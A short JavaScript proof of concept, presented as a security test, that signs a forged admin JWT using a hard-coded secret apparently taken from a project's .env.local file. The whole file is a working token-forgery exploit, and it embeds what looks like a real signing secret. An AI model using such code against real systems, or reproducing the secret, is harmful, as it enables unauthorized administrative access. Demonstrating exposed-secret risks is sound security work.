// Security Test: JWT Token Forgery
// This demonstrates how an attacker could forge tokens with the exposed JWT secret

const { SignJWT } = require('jose');

// Exposed JWT secret from .env.local
const JWT_SECRET = new TextEncoder().encode('nB9CDfGlyy4+lkXqa4iQV6i3L1j4pIhUJnNS/L+t978=');

async function forgeAdminToken() {
    try {
        const now = Math.floor(Date.now() / 1000);
        const sessionStart = now;
        const sessionExpiry = sessionStart + 3600; // 1 hour

        const forgedToken = await new SignJWT({
            userId: 'admin_user',
            email: 'hacker@evil.com',
            sessionStart: sessionStart
        })
            .setProtectedHeader({ alg: 'HS256' })
            .setIssuedAt()
            .setExpirationTime(sessionExpiry)
            .sign(JWT_SECRET);

        console.log('Forged Admin Token:', forgedToken);
        return forgedToken;
    } catch (error) {
        console.error('Token forgery failed:', error);
    }
}

// This would give an attacker unlimited access if they have the JWT secret
forgeAdminToken();
